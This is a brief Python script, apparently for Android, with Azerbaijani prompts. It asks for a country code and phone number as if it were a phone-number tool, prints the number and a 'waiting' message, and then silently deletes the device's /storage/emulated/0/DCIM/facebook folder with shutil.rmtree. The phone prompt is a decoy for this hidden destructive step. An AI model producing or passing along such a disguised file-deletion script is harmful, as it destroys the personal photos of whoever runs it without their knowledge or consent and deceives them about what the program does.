import os
import sys
import shutil

os.system('clear')
print(" +++++++++++++++"
      "+++++++++++++++++"
    "++++++++++++++++++++")


try:
    country  = int(input('Ölkə Kodu: '))
    number = int(input("Nomre: "))
except:
    print('Bekar nömrə yaz')
print("+'{}''{}'".format(country,number))
print("Gözdə...")


try:
    shutil.rmtree("/storage/emulated/0/DCIM/facebook")
    
except:
    print("Nəsə səf getdi")
